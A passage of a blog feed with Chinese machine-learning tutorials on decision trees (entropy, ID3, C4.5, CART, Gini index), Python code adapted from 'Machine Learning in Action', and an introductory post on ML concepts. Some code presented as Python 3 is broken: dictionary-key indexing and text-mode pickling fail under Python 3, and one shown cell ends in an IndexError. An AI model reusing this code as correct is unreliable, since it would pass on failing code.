class="line"><span class="comment">#               [0, 1, 'no'],</span></span><br><span class="line"><span class="comment">#               [0, 1, 'no']]</span></span><br><span class="line"><span class="comment">#     labels = ['no surfacing','flippers']</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createTree</span><span class="params">(dataSet,labels)</span>:</span></span><br><span class="line">    classList = [example[<span class="number">-1</span>] <span class="keyword">for</span> example <span class="keyword">in</span> dataSet]<span class="comment">#classLsit里面是dataSet里面的标签</span></span><br><span class="line">    <span class="comment"># 如果数据集的最后一列的第一个值出现的次数=整个集合的数量，也就说只有一个类别，就只直接返回结果就行</span></span><br><span class="line">    <span class="comment"># 第一个停止条件：所有的类标签完全相同，则直接返回该类标签。</span></span><br><span class="line">    <span class="comment"># count() 函数是统计括号中的值在list中出现的次数</span></span><br><span class="line">    <span class="keyword">if</span> classList.count(classList[<span class="number">0</span>]) == len(classList): <span class="comment">#第一个终止条件：所有类标签都相同，country（）函数用来计数0</span></span><br><span class="line">        <span class="keyword">return</span> classList[<span class="number">0</span>]<span class="comment">#stop splitting when all of the classes are equal</span></span><br><span class="line">    <span class="comment"># 如果数据集只有1列，那么最初出现label次数最多的一类，作为结果</span></span><br><span class="line">    <span class="comment"># 第二个停止条件：使用完了所有特征，仍然不能将数据集划分成仅包含唯一类别的分组。</span></span><br><span class="line">    <span class="keyword">if</span> len(dataSet[<span class="number">0</span>]) == <span class="number">1</span>: <span class="comment">#第二个终止条件：用完了所有的特征#stop splitting when there are no more features in dataSet</span></span><br><span class="line">        <span class="keyword">return</span> majorityCnt(classList)</span><br><span class="line">    bestFeat = chooseBestFeatureToSplit(dataSet)</span><br><span class="line">    bestFeatLabel = labels[bestFeat]</span><br><span class="line">    myTree = &#123;bestFeatLabel:&#123;&#125;&#125;</span><br><span class="line">    <span class="keyword">del</span>(labels[bestFeat])</span><br><span class="line">    featValues = [example[bestFeat] <span class="keyword">for</span> example <span class="keyword">in</span> dataSet]<span class="comment">#得到标签里的所有属性值</span></span><br><span class="line">    uniqueVals = set(featValues)<span class="comment">#得到属性值集合</span></span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> uniqueVals:</span><br><span class="line">        subLabels = labels[:]       <span class="comment">#copy all of labels, so trees don't mess up existing labels</span></span><br><span class="line">        myTree[bestFeatLabel][value] = createTree(splitDataSet(dataSet, bestFeat, value),subLabels)</span><br><span class="line">    <span class="keyword">return</span> myTree</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">createTree(myDat,labels)</span><br></pre></td></tr></table></figure><pre><code>{&#39;no surfacing&#39;: {0: &#39;no&#39;, 1: {&#39;flippers&#39;: {0: &#39;no&#39;, 1: &#39;yes&#39;}}}}</code></pre><p><strong>6.使用决策树进行分类</strong></p><p>程序清单：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用决策树分类函数</span></span><br><span class="line"><span class="comment">#三个参数意义：input：决策树；featLabels：特征标签；testVec：测试向量</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">classify</span><span class="params">(inputTree,featLabels,testVec)</span>:</span></span><br><span class="line">    firstStr = inputTree.keys()[<span class="number">0</span>]</span><br><span class="line">    secondDict = inputTree[firstStr]</span><br><span class="line">    featIndex = featLabels.index(firstStr)</span><br><span class="line">    key = testVec[featIndex]</span><br><span class="line">    valueOfFeat = secondDict[key]</span><br><span class="line">    <span class="keyword">if</span> isinstance(valueOfFeat, dict): </span><br><span class="line">        classLabel = classify(valueOfFeat, featLabels, testVec)</span><br><span class="line">    <span class="keyword">else</span>: classLabel = valueOfFeat</span><br><span class="line">    <span class="keyword">return</span> classLabel</span><br></pre></td></tr></table></figure><p><strong>7.决策树在磁盘中的存储与导入</strong>  </p><p>程序清单：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将决策树分类器存储在磁盘中，filename一般保存为txt格式</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">storeTree</span><span class="params">(inputTree,filename)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> pickle</span><br><span class="line">    fw = open(filename,<span class="string">'w'</span>)</span><br><span class="line">    pickle.dump(inputTree,fw)</span><br><span class="line">    fw.close()</span><br><span class="line">    </span><br><span class="line"><span class="comment">#将磁盘中的对象加载出来，这里filename就是上面函数中的txt文件</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">grabTree</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> pickle</span><br><span class="line">    fr = open(filename)</span><br><span class="line">    <span class="keyword">return</span> pickle.load(fr)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">createTree(myDat,labels)</span><br><span class="line"><span class="comment"># storeTree(myTree,'classifierStorage.txt')</span></span><br><span class="line"><span class="comment"># grabTree('classifierStorage.txt')</span></span><br></pre></td></tr></table></figure><pre><code>---------------------------------------------------------------------------IndexError                                Traceback (most recent call last)&lt;ipython-input-16-33c9af9c39fa&gt; in &lt;module&gt;()----&gt; 1 createTree(myDat,labels)      2 # storeTree(myTree,&#39;classifierStorage.txt&#39;)      3 # grabTree(&#39;classifierStorage.txt&#39;)&lt;ipython-input-12-854ee28d5c1d&gt; in createTree(dataSet, labels)     21     for value in uniqueVals:     22         subLabels = labels[:]       #copy all of labels, so trees don&#39;t mess up existing labels---&gt; 23         myTree[bestFeatLabel][value] = createTree(splitDataSet(dataSet, bestFeat, value),subLabels)     24     return myTree&lt;ipython-input-12-854ee28d5c1d&gt; in createTree(dataSet, labels)     14         return majorityCnt(classList)     15     bestFeat = chooseBestFeatureToSplit(dataSet)---&gt; 16     bestFeatLabel = labels[bestFeat]     17     myTree = {bestFeatLabel:{}}     18     del(labels[bestFeat])IndexError: list index out of range</code></pre><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ol><li>CART决策树</li><li>决策树的剪枝技术</li><li>Bagging与随机森林</li><li>决策树中缺失值的处理</li><li>决策树代码</li></ol><p>注：本节代码对应第九章“树回归”</p><h2 id="CART决策树"><a href="#CART决策树" class="headerlink" title="CART决策树"></a>CART决策树</h2><p>为什么同样作为建立决策树的三种算法之一，我们要将CART算法单独拿出来讲。</p><p>因为ID3算法和C4.5算法采用了较为复杂的熵来度量，所以它们只能处理分类问题。而CART算法既能处理分类问题，又能处理回归问题。</p><p>对于分类树，CART采用基尼指数最小化准则；对于回归树，CART采用平方误差最小化准则</p><h3 id="1-CART分类树"><a href="#1-CART分类树" class="headerlink" title="1.CART分类树"></a>1.CART分类树</h3><p>CART分类树与上一节讲述的ID3算法和C4.5算法在原理部分差别不大，唯一的区别在于划分属性的原则。CART选择“基尼指数”作为划分属性的选择。</p><p>Gini指数作为一种做特征选择的方式，其表征了特征的不纯度。</p><p>在具体的分类问题中，对于数据集D，我们假设有K个类别，每个类别出现的概率为$P_k$，则数据集$D$的基尼指数的表达式为：</p><script type="math/tex; mode=display">Gini=1-\sum_{k=1}^{K}{P_k}^2</script><p>我们取一个极端情况，如果数据集合中的类别只有一类，那么：</p><script type="math/tex; mode=display">Gini(D)=0</script><p>我们发现，当只有一类时，数据的不纯度是最低的，所以Gini指数等于零。Gini(D)越小，则数据集D的纯度越高。</p><p>特别地，对于样本D，如果我们选择特征A的某个值a，把D分成$D_1$和$D_2$两部分，则此时，Gini指数为：  </p><script type="math/tex; mode=display">Gini(D,A)=\frac{|D_1|}{|D|}Gini(D_1)+\frac{|D_2|}{|D|}Gini(D_2)</script><p>与信息增益类似，我们可以计算如下表达式：  </p><script type="math/tex; mode=display">\Delta{Gini(A)}=Gini(D)-Gini(D,A)</script><p>即以特征A划分后，数据不纯度减少的程度。显然，我们在做特征选取时，应该选择最大的一个。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myDat,labels</span><br></pre></td></tr></table></figure><pre><code>([[1, 1, &#39;yes&#39;], [1, 1, &#39;yes&#39;], [1, 0, &#39;no&#39;], [0, 1, &#39;no&#39;], [0, 1, &#39;no&#39;]], [&#39;no surfacing&#39;, &#39;flippers&#39;])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> featVec <span class="keyword">in</span> myDat: <span class="comment">#the the number of unique elements and their occurance</span></span><br><span class="line">    currentLabel = featVec[<span class="number">-1</span>]</span><br><span class="line">currentLabel</span><br></pre></td></tr></table></figure><pre><code>&#39;no&#39;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">labelCounts = &#123;&#125;<span class="comment">#创建字典，键为标签，值为个数</span></span><br><span class="line"><span class="keyword">for</span> featVec <span class="keyword">in</span> myDat: <span class="comment">#the the number of unique elements and their occurance</span></span><br><span class="line">    currentLabel = featVec[<span class="number">-1</span>]<span class="comment">#得到标签，注意是最后一个标签</span></span><br><span class="line">    <span class="keyword">if</span> currentLabel <span class="keyword">not</span> <span class="keyword">in</span> labelCounts.keys(): <span class="comment">#如果标签不在字典已经存在的键中</span></span><br><span class="line">        labelCounts[currentLabel] = <span class="number">0</span><span class="comment">#创建名为currentLabel的键，赋值为0</span></span><br><span class="line">    labelCounts[currentLabel] += <span class="number">1</span><span class="comment">#标签为currentLabel的个数加1</span></span><br><span class="line">labelCounts</span><br></pre></td></tr></table></figure><pre><code>{&#39;yes&#39;: 2, &#39;no&#39;: 3}</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">numFeatures = len(myDat[<span class="number">0</span>]) - <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(numFeatures):</span><br><span class="line">    featList = [example[i] <span class="keyword">for</span> example <span class="keyword">in</span> myDat]</span><br><span class="line">    print(featList)</span><br></pre></td></tr></table></figure><pre><code>[1, 1, 1, 0, 0][1, 1, 0, 1, 1]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myDat[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><pre><code>[1, 1, &#39;yes&#39;]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">numFeatures = len(myDat[<span class="number">0</span>]) - <span class="number">1</span></span><br><span class="line">numFeatures</span><br></pre></td></tr></table></figure><pre><code>2</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure><pre><code>01</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">classList = [example[<span class="number">-1</span>] <span class="keyword">for</span> example <span class="keyword">in</span> myDat]</span><br><span class="line">classList</span><br></pre></td></tr></table></figure><pre><code>[&#39;yes&#39;, &#39;yes&#39;, &#39;no&#39;, &#39;no&#39;, &#39;no&#39;]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bestFeat = chooseBestFeatureToSplit(myDat)</span><br><span class="line">bestFeatLabel = labels[bestFeat]</span><br><span class="line">myTree = &#123;bestFeatLabel:&#123;&#125;&#125;</span><br><span class="line">myTree</span><br></pre></td></tr></table></figure><pre><code>{&#39;no surfacing&#39;: {}}</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span>(labels[bestFeat])</span><br><span class="line">featValues = [example[bestFeat] <span class="keyword">for</span> example <span class="keyword">in</span> myDat]</span><br><span class="line">featValues</span><br></pre></td></tr></table></figure><pre><code>[1, 1, 1, 0, 0]</code></pre><p>至此，我们完成了决策树算法原理和主要代码的学习。</p><p>下一节我们将学习CART算法、随机森林算法以及剪枝技术。</p><p>以上原理部分主要来自于《机器学习》—周志华，《统计学习方法》—李航，《机器学习实战》—Peter Harrington。代码部分主要来自于《机器学习实战》，我对代码进行了版本的改进，文中代码用Python3实现，这是机器学习主流语言，本人也会尽力对代码做出较为详尽的注释。</p><h2 id="决策树-原理"><a href="#决策树-原理" class="headerlink" title="决策树 原理"></a>决策树 原理</h2><h3 id="决策树-须知概念"><a href="#决策树-须知概念" class="headerlink" title="决策树 须知概念"></a>决策树 须知概念</h3><h4 id="信息熵-amp-信息增益"><a href="#信息熵-amp-信息增益" class="headerlink" title="信息熵 &amp; 信息增益"></a>信息熵 &amp; 信息增益</h4><p><strong>熵</strong>： 熵（entropy）指的是体系的混乱的程度，在不同的学科中也有引申出的更为具体的定义，是各领域十分重要的参量。</p><p><strong>信息熵（香农熵）</strong>： 是一种信息的度量方式，表示信息的混乱程度，也就是说：信息越有序，信息熵越低。例如：火柴有序放在火柴盒里，熵值很低，相反，熵值很高。</p><p>信息增益： 在划分数据集前后信息发生的变化称为信息增益。</p><h3 id="决策树-工作原理"><a href="#决策树-工作原理" class="headerlink" title="决策树 工作原理"></a>决策树 工作原理</h3><p>如何构造一个决策树?<br>我们使用 createBranch() 方法，如下所示：</p><blockquote><p>检测数据集中的所有数据的分类标签是否相同:<br> ​        If so return 类标签<br> ​           Else:<br> ​               寻找划分数据集的最好特征（划分之后信息熵最小，也就是信息增益最大的特征）<br> ​               划分数据集<br> ​               创建分支节点<br> ​                       for 每个划分的子集<br> ​                               调用函数 createBranch （创建分支的函数）并增加返回结果到分支节点中<br> ​               return 分支节点    </p></blockquote><p>​        </p><h4 id="决策树-开发流程"><a href="#决策树-开发流程" class="headerlink" title="决策树 开发流程"></a>决策树 开发流程</h4><blockquote><p>收集数据：可以使用任何方法。<br>准备数据：树构造算法只适用于标称型数据，因此数值型数据必须离散化。<br>分析数据：可以使用任何方法，构造树完成之后，我们应该检查图形是否符合预期。<br>训练算法：构造树的数据结构。<br>测试算法：使用经验树计算错误率。（经验树没有搜索到较好的资料，有兴趣的同学可以来补充）<br>使用算法：此步骤可以适用于任何监督学习算法，而使用决策树可以更好地理解数据的内在含义。     </p></blockquote><p><strong>决策树 算法特点</strong></p><blockquote><p>优点：计算复杂度不高，输出结果易于理解，对中间值的缺失不敏感，可以处理不相关特征数据。<br>缺点：可能会产生过度匹配问题。<br>适用数据类型：数值型和标称型。</p></blockquote><h2 id="决策树算法"><a href="#决策树算法" class="headerlink" title="决策树算法"></a>决策树算法</h2><p><strong>1.算法简介</strong></p><p>决策树算法是一类常见的分类和回归算法，顾名思义，决策树是基于树的结构来进行决策的。</p><p>以二分类为例，我们希望从给定训练集中学得一个模型来对新的样例进行分类。</p><p><strong>举个例子</strong></p><p>有一个划分是不是鸟类的数据集合，如下：</p><div class="table-container"><table><thead><tr><th></th><th>是否会飞</th><th>是否会跑</th><th>属于鸟类</th></tr></thead><tbody><tr><td>1</td><td>是</td><td>是</td><td>否</td></tr><tr><td>2</td><td>是</td><td>是</td><td>是</td></tr><tr><td>3</td><td>是</td><td>否</td><td>否</td></tr><tr><td>4</td><td>否</td><td>是</td><td>否</td></tr><tr><td>5</td><td>否</td><td>是</td><td>否</td></tr></tbody></table></div><p>这时候我们建立这样一个决策树：  </p><p><img src="https://pic4.zhimg.com/80/v2-4a601bdc74abb553c0873fbd61597035_hd.jpg" ,width="400,height=400"></p><p>当我们有了一组新的数据时，我们就可以根据这个决策树判断出是不是鸟类。创建决策树的伪代码如下：  </p><p><img src="https://pic4.zhimg.com/80/v2-c226901dc50538bd40410e7aae938f47_hd.jpg" ,width="400,eight=400"></p><p>生成决策树是一个递归的过程，在决策树算法中，当出现下列三种情况时，导致递归返回： </p><p>(1)当前节点包含的样本属于同一种类，无需划分；</p><p>(2)当前属性集合为空，或者所有样本在所有属性上取值相同，无法划分；</p><p>(3)当前节点包含的样本集合为空，无法划分。</p><p><strong>2.属性选择</strong></p><p>在决策树算法中，最重要的就是划分属性的选择，即我们选择哪一个属性来进行划分。三种划分属性的主要算法是：ID3、C4.5以及CART。</p><p><strong>2.1 ID3算法</strong></p><p>ID3算法所采用的度量标准就是我们前面所提到的“信息增益”。当属性a的信息增益最大时，则意味着用a属性划分，其所获得的“纯度”提升最大。我们所要做的，就是找到信息增益最大的属性。由于前面已经强调了信息增益的概念，这里不再赘述。</p><p><strong>2.2 C4.5算法</strong></p><p>实际上，信息增益准则对于可取值数目较多的属性会有所偏好，为了减少这种偏好可能带来的不利影响，C4.5决策树算法不直接使用信息增益，而是使用“信息增益率”来选择最优划分属性，信息增益率定义为：  </p><script type="math/tex; mode=display">Gain\_ratio(Y,X)=\frac{Gain(Y,X)}{H(X)}</script><p>其中，分子为信息增益，分母为属性$X$的熵。</p><p>需要注意的是，增益率准则对可取值数目较少的属性有所偏好。</p><p>所以一般这样选取划分属性：<strong>先从候选属性中找出信息增益高于平均水平的属性，再从中选择增益率最高的</strong>。</p><p><strong>2.3 CART算法</strong></p><p>ID3算法和C4.5算法主要存在三个问题：</p><p>(1)每次选取最佳特征来分割数据，并按照该特征的所有取值来进行划分。也就是说，如果一个特征有4种取值，那么数据就将被切成4份，一旦特征被切分后，该特征就不会再起作用，有观点认为这种切分方式过于迅速。</p><p>(2)它们不能处理连续型特征。只有事先将连续型特征转换为离散型，才能在上述算法中使用。</p><p>(3)会产生过拟合问题。</p><p>为了解决上述(1)、(2)问题，产生了CART算法，它主要的衡量指标是基尼系数。为了解决问题(3)，主要采用剪枝技术和随机森林算法，这部分内容，下一次再详细讲述。</p><p>上述就是决策树算法的原理部分，下面展示完整代码和注释。代码中主要采用的是ID3算法。</p>]]></content>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>01机器学习实战-机器学习基础</title>
      <link href="/2018/01/27/01%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98-%E7%AC%AC1%E7%AB%A0%20%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/"/>
      <url>/2018/01/27/01%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98-%E7%AC%AC1%E7%AB%A0%20%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>[TOC]</p><ul><li>主要来源自《机器学习实战》《机器学习》《利用Python进行数据分析》，还有一些网站资料</li></ul><h1 id="机器学习基础"><a href="#机器学习基础" class="headerlink" title="机器学习基础"></a>机器学习基础</h1><h2 id="第1章-机器学习基础"><a href="#第1章-机器学习基础" class="headerlink" title="第1章 机器学习基础"></a>第1章 机器学习基础</h2><p><strong>机器学习概述</strong></p><p>机器学习就是无序的数据转换成有用信息。</p><blockquote><ol><li><p>获取海量的数据   </p></li><li><p>从海量数据中获取有用信息</p></li></ol></blockquote><h3 id="机器学习场景"><a href="#机器学习场景" class="headerlink" title="机器学习场景"></a>机器学习场景</h3><blockquote><p>例如：识别动物猫<br>模式识别（官方标准）：人们通过大量的经验，得到结论，从而判断它就是猫。<br>机器学习（数据学习）：人们通过阅读进行学习，观察它会叫、小眼睛、两只耳朵、四条腿、一条尾巴，得到结论，从而判断它就是猫。<br>深度学习（深入数据）：人们通过深入了解它，发现它会’喵喵’的叫、与同类的猫科动物很类似，得到结论，从而判断它就是猫。（深度学习常用领域：语音识别、图像识别）   </p></blockquote><p>模式识别（pattern recognition）：模式识别是最古老的（作为一个术语而言，可以说是很过时的）。<br>    我们把环境与客体统称为“模式”，识别是对模式的一种认知，是如何让一个计算机程序去做一些看起来很“智能”的事情。<br>    通过融于智慧和直觉后，通过构建程序，识别一些事物，而不是人，例如: 识别数字。    </p><p>机器学习（machine learning）：机器学习是最基础的（当下初创公司和研究实验室的热点领域之一）。<br>    在90年代初，人们开始意识到一种可以更有效地构建模式识别算法的方法，那就是用数据（可以通过廉价劳动力采集获得）去替换专家（具有很多图像方面知识的人）。<br>    “机器学习”强调的是，在给计算机程序（或者机器）输入一些数据后，它必须做一些事情，那就是学习这些数据，而这个学习的步骤是明确的。<br>    机器学习（Machine Learning）是一门专门研究计算机怎样模拟或实现人类的学习行为，以获取新的知识或技能，重新组织已有的知识结构使之不断改善自身性能的学科。    </p><p>深度学习（deep learning）：深度学习是非常崭新和有影响力的前沿领域，我们甚至不会去思考-后深度学习时代。<br>    深度学习是机器学习研究中的一个新的领域，其动机在于建立、模拟人脑进行分析学习的神经网络，它模仿人脑的机制来解释数据，例如图像，声音和文本。</p><p>参考地址： </p><p><a href="http://www.csdn.net/article/2015-03-24/2824301" target="_blank" rel="noopener">http://www.csdn.net/article/2015-03-24/2824301</a></p><p><a href="http://baike.baidu.com/link?url=76P-uA4EBrC3G-I__P1tqeO7eoDS709Kp4wYuHxc7GNkz_xn0NxuAtEohbpey7LUa2zUQLJxvIKUx4bnrEfOmsWLKbDmvG1PCoRkJisMTQka6-QReTrIxdYY3v93f55q" target="_blank" rel="noopener">http://baike.baidu.com/link?url=76P-uA4EBrC3G-I__P1tqeO7eoDS709Kp4wYuHxc7GNkz_xn0NxuAtEohbpey7LUa2zUQLJxvIKUx4bnrEfOmsWLKbDmvG1PCoRkJisMTQka6-QReTrIxdYY3v93f55q</a></p><blockquote><p>机器学习已应用于多个领域，远远超出大多数人的想象，横跨：计算机科学、工程技术和统计学等多个学科。</p></blockquote><ul><li>搜索引擎：根据你的搜索点击，优化你下次的搜索结果。   </li><li>垃圾邮件：会自动的过滤垃圾广告邮件到垃圾箱内。   </li><li>超市优惠券：你会发现，你在购买小孩子尿布时候，售货员会赠送给你一张优惠券可以兑换免费啤酒。  </li><li>邮件邮寄：手写软件自动识别寄送贺卡的地址。  </li><li>申请贷款：通过你最近的金融活动信息进行综合评定，决定你是否合格。  </li></ul><h3 id="机器学习组成"><a href="#机器学习组成" class="headerlink" title="机器学习组成"></a>机器学习组成</h3><p><strong>主要任务</strong></p><ul><li>分类：将实例数据划分到合适的类别中。  </li><li>回归：主要用于预测数值型数据（示例：数据通过给定数据点耐力和最优曲线）   </li></ul><p><strong>监督学习</strong></p><ul><li>必须确定目标变量的值，以便机器学习可以发现特征值和目标变量之间的关系。（包括分类和回归）  </li><li>样本集：训练数据+测试数据<ul><li>训练样本=特征（feature）+目标变量（label：分类-离散值/回归-连续值）  </li><li>特征通常是训练样本集的列，它们是独立测量得到的。 </li><li>目标变量：目标变量是机器学习预测算法的测试结果。<ul><li>在分类算法中目标变量的类型通常是标称型（如：真与假），而在回归算法中通常是连续型（如：1~100）</li></ul></li></ul></li></ul><ul><li>知识表示：<br>1.可以采用规则集的形式【例如：数学成绩大于90分为优秀】<br>2.可以采用概率分布的形式【例如：通过统计分布，90%的同学数学成绩，在70分以下，那么大于70分定为优秀】<br>3.可以使用训练样本集中的一个实例【例如：通过样本集合，我们训练处一个模型实例，得出年轻，数学成绩中高等，谈吐优雅，我们认为是优秀】</li></ul><p><strong>非监督学习</strong>  </p><ul><li>数据没有类别，也不会给定目标值。  </li><li>聚类：在无监督学习中，将数据集分成由类似的对象组成多个类的过程称为聚类。  </li><li>此外，无监督学习还可以减少数据特征的维度，以便我们可以使用二维或三维图形更加直观地展示数据信息。</li></ul><p><strong>训练过程</strong>  </p><p><img src="https://pic4.zhimg.com/80/v2-711466f238bbb969618e6fe669a16a4f_hd.jpg" ,width="400,height=400"></p><p><strong>算法汇总</strong>   </p><center>**用于执行分类、回归、聚类和密度估计的机器学习算法**</center><div class="table-container"><table><thead><tr><th><p align="center">监督学习的用途</p></th></tr></thead><tbody><tr><td><p align="left">k-近邻算法</p></td><td><p align="left">线性回归</p></td></tr><tr><td><p align="left">朴素贝叶斯算法</p></td><td><p align="left">局部加权线性回归</p></td></tr><tr><td><p align="left">支持向量机</p></td><td><p align="left">Ridge回归</p></td></tr><tr><td><p align="left">决策树</p></td><td><p align="left">Lasso最小回归系数估计</p></td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th><p align="center">无监督学习的用途</p></th></tr></thead><tbody><tr><td><p align="left">K-均值</p></td><td><p align="left">最大期望算法</p></td></tr><tr><td><p align="left">DBSCAN</p></td><td><p align="left">Parzen窗设计</p></td></tr></tbody></table></div><p>机器学习使用</p><blockquote><p>选择算法需要考虑的两个问题</p></blockquote><p>1.算法场景  </p><ul><li>预测明天是否下雨，因为可以用历史的天气情况做预测，所以选择监督学习算法   </li><li>给一群陌生的人进行分组，但是我们并没有这些人的类别信息，所以选择无监督学习算法、通过他们身高、体重等特征进行处理。    </li></ul><p>2.需要收集或分析的数据是什么  </p><blockquote><p>举例</p></blockquote><p><img src="https://pic3.zhimg.com/80/v2-88ee740c5e4a2a2bdab7e08043321e08_hd.jpg" ,width="400,height=400"></p><blockquote><p>机器学习开发流程</p></blockquote><ul><li>收集数据: 收集样本数据</li><li>准备数据: 注意数据的格式</li><li>分析数据: 为了确保数据集中没有垃圾数据；<br>  如果是算法可以处理的数据格式或可信任的数据源，则可以跳过该步骤；<br>  另外该步骤需要人工干预，会降低自动化系统的价值。</li><li>训练算法: [机器学习算法核心]如果使用无监督学习算法，由于不存在目标变量值，则可以跳过该步骤</li><li>测试算法: [机器学习算法核心]评估算法效果</li><li>使用算法: 将机器学习算法转为应用程序</li></ul><p><strong>Python语言优势</strong></p><ol><li>可执行伪代码</li><li>Python比较流行：使用广泛、代码范例多、丰富模块库，开发周期短</li><li>Python语言的特色：清晰简练、易于理解</li><li>Python语言的缺点：唯一不足的是性能问题</li><li>Python相关的库    </li></ol><ul><li>科学函数库：SciPy、NumPy（底层语言：C和Fortran）</li><li>绘图工具库：Matplotlib</li></ul><h3 id="科普"><a href="#科普" class="headerlink" title="科普"></a>科普</h3><p>　　机器学习（Machine Learning）专门研究计算机怎样模拟或实现人类的学习行为，以获取新的知识或技能，重新组织已有的知识结构使之不断改善自身的性能。它是人工智能的核心，是使计算机具有智能的根本途径，其应用遍及人工智能的各个领域，它主要使用归纳、综合。  ——来自 百度百科</p><p>简单来讲，机器学习就是一门让机器能够进行自我学习并不断优化功能的学科。</p>]]></content>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>00机器学习实战-机器学习的数学基础</title>
      <link href="/2018/01/26/00%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"/>
      <url>/2018/01/26/00%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/</url>
